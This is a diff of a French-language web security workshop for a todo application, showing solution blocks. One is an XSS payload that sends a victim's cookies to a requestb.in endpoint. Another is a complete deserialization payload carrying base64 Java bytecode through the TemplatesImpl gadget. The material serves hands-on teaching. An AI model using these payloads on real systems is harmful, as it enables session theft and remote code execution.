@@ -288,7 +288,7 @@ Créez un todo de type publique avec un script d'attaque
 [id=reponse9,role=collapse]
 --
 utilisez le code suivant dans la description de la todo (en remplaçant l'url par votre instance requestb.in).
-<script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
+<script>document.write("<img src=https://requestb.in/1lwyhpu1?s="\+encodeURI(document.cookie)+"></img>");</script>
 --
 
 * Correction
@@ -365,7 +365,7 @@ Un autre type d'attaque XXE existe. Essayez de l'exploiter sur la ressource `tod
 
 == Augmentez vos privilèges
 
-Connectez vous avec votre compte utilisateur : devoxx/devoxx2018 et essayez d'obtenir les droits administrateurs
+Créez puis reconnectez vous avec votre compte utilisateur : devoxx/devoxx2018 et essayez d'obtenir les droits administrateurs
 en modifiant le contenu d'une requête REST légitime.
 
 
@@ -553,8 +553,49 @@ Regarder le format Json des Todos pour utiliser un tel exploit.
 
 [id=reponse10,role=collapse]
 --
-utilisez le code suivant dans la description de la todo (en remplaçant l'id 1lwyhpu1 par celui que vous avez généré).
-<script>document.write("<img src=https://requestb.in/1lwyhpu1?s="+encodeURI(document.cookie)+"></img>");</script>
+Le payload complet est :
+{
+"userId": 1, "summary": "hacking", "description": "you've been hacked",
+ "secret" :[ "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+  {
+    "transletBytecodes" : [ "yv66vgAAADQAMQoABwAhCQAFACIIACMLACQAJQcAJgoAJwAoBwApAQADTE9HAQAS
+TG9yZy9zbGY0ai9Mb2dnZXI7AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVO
+dW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBACZMaW8vZ2l0
+aHViL2phdmF0aG91Z2h0L2Rldm94eC9FeHBsb2l0OwEACXRyYW5zZm9ybQEApihM
+Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
+L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9y
+O0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
+aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9h
+cGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGl0ZXJhdG9yAQA1TGNv
+bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRv
+cjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwv
+c2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAq
+AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9N
+O1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1Nl
+cmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3Jn
+L2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu
+ZGxlcjsBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAxFeHBsb2l0LmphdmEMAAoA
+CwwACAAJAQAZWW91ciBsb2cgaGF2ZSBiZWVuIGhhY2tlZAcAKwwALAAtAQAkaW8v
+Z2l0aHViL2phdmF0aG91Z2h0L2Rldm94eC9FeHBsb2l0BwAuDAAvADABAEBjb20v
+c3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0
+cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFs
+L3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQb3JnL3NsZjRqL0xvZ2dlcgEABWVy
+cm9yAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAXb3JnL3NsZjRqL0xvZ2dlckZh
+Y3RvcnkBAAlnZXRMb2dnZXIBACUoTGphdmEvbGFuZy9DbGFzczspTG9yZy9zbGY0
+ai9Mb2dnZXI7ACEABQAHAAAAAQAaAAgACQAAAAQAAQAKAAsAAQAMAAAAQQACAAEA
+AAAPKrcAAbIAAhIDuQAEAgCxAAAAAgANAAAADgADAAAADgAEAA8ADgAQAA4AAAAM
+AAEAAAAPAA8AEAAAAAEAEQASAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEA
+AAAVAA4AAAAqAAQAAAABAA8AEAAAAAAAAQATABQAAQAAAAEAFQAWAAIAAAABABcA
+GAADABkAAAAEAAEAGgABABEAGwACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgAB
+AAAAGgAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABwAHQACABkAAAAE
+AAEAGgAIAB4ACwABAAwAAAAhAAEAAAAAAAkSBbgABrMAArEAAAABAA0AAAAGAAEA
+AAAMAAEAHwAAAAIAIA==
+" ],
+    "transletName" : "a.b",
+    "outputProperties" : { }
+  }
+ ]
+}
 --
 
 * Correction
